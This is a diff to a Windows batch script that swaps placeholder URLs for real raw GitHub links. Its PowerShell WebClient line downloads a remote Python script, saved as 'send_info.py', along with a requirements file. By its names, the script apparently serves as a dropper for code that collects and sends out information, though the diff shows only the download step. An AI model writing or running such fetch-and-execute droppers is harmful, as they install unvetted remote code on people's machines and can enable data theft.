@@ -2,8 +2,8 @@
 setlocal
 
 :: Set the URLs for the Python script and requirements file
-set "PYTHON_SCRIPT_URL=https://yourdomain.com/send_info.py"
-set "REQUIREMENTS_URL=https://yourdomain.com/requirements.txt"
+set "PYTHON_SCRIPT_URL=https://github.com/Koulner/exposed_bat/raw/refs/heads/main/python.py"
+set "REQUIREMENTS_URL=https://github.com/Koulner/exposed_bat/raw/refs/heads/main/requirements.txt"
 
 :: Download the Python script
 powershell -Command "(New-Object System.Net.WebClient).DownloadFile('%PYTHON_SCRIPT_URL%', 'send_info.py')"
